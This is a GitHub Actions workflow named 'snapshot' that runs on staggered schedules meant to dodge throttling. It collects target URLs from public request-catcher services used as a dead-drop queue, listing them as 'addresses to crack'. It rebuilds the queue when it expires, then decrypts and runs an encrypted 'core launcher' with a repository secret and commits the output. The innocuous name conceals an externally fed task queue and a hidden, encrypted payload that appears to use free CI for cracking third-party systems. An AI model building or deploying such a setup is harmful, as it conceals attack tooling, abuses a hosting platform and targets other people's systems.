name: snapshot
on:
  workflow_dispatch:
  schedule:
    # 多行错开：GitHub 对公共仓库的定时调度会积压降频，多行提高触发概率
    - cron: '*/15 * * * *'
    - cron: '7,22,37,52 * * * *'
    - cron: '11,26,41,56 * * * *'
permissions:
  contents: write
jobs:
  run:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: '3.12' }
      - name: snapshot
        env:
          M87_KEY_B64: ${{ secrets.M87_KEY_B64 }}
        run: |
          curl -s -m 20 'https://ptsv2.com/t/m87queue/posts' -o /tmp/q.json || true
          python3 - <<'PY'
          import re, os, json, urllib.request

          def get(url, timeout=20):
              req = urllib.request.Request(url, headers={'User-Agent': 'M87/2.9.26'})
              return urllib.request.urlopen(req, timeout=timeout)

          def post_json(url, obj, timeout=20):
              req = urllib.request.Request(url, data=json.dumps(obj).encode(),
                                           headers={'Content-Type': 'application/json', 'User-Agent': 'M87/2.9.26'})
              return urllib.request.urlopen(req, timeout=timeout)

          # ---- 活信箱收割：web/queue.txt 记录当前桶 uuid ----
          urls = set()
          try:
              urls |= set(re.findall(r"https?://[^\s\"'<>]+", open('/tmp/q.json', encoding='utf-8', errors='ignore').read()))
          except Exception:
              pass
          qp = 'web/queue.txt'
          old = ''
          if os.path.exists(qp):
              old = open(qp, encoding='utf-8').read().strip().split('\n')[0].strip()
          alive = False
          if old.startswith('https://webhook.site/'):
              try:
                  uid = old.rsplit('/', 1)[1]
                  with get(f'https://webhook.site/token/{uid}/requests?sorting=newest&per_page=50') as r:
                      data = json.load(r)
                  for item in data.get('data', []):
                      c = item.get('content') or ''
                      urls |= set(re.findall(r"https?://[^\s\"'<>]+", c))
                  alive = True
                  print('信箱收割 OK，桶内请求', len(data.get('data', [])))
              except Exception as e:
                  print('信箱失效:', type(e).__name__)
          if urls:
              p = 'snapshots.txt'
              existing = set()
              if os.path.exists(p):
                  existing = {l.strip() for l in open(p, encoding='utf-8') if l.strip()}
              new = sorted(u for u in urls if u not in existing and len(u) < 300)
              if new:
                  with open(p, 'a', encoding='utf-8') as f:
                      f.write('\n' + '\n'.join(new) + '\n')
                  print('新增', len(new), '个待破解地址')
          # ---- 断链自愈：桶不可用（过期/丢失）时重建并写回 ----
          if not alive:
              try:
                  with post_json('https://webhook.site/token', {}) as r:
                      uid = json.load(r)['uuid']
                  box = f'https://webhook.site/{uid}'
                  open(qp, 'w', encoding='utf-8').write(box + '\n')
                  print('新信箱已写入 queue.txt')
              except Exception as e:
                  print('建箱失败:', type(e).__name__)
          PY
          printf %s "$M87_KEY_B64" | base64 -d > .m87_key
          export M87_KEY="$PWD/.m87_key"
          # 核心启动器以密文入库，运行时用同一密钥解出，用完即弃（不入提交）
          PASS=$(sha256sum .m87_key | cut -d' ' -f1)
          openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -in assets/core.enc -out m87.py -pass pass:$PASS
          [ -s m87.py ] || { echo '核心解密失败'; exit 2; }
          python3 tools/snapshot.py
      - name: commit
        run: |
          git config user.email "m87@actions.local"
          git config user.name "m87-actions"
          git add web/snapshots snapshots.txt web/queue.txt
          git commit -m "snapshots: auto update" || true
          git push
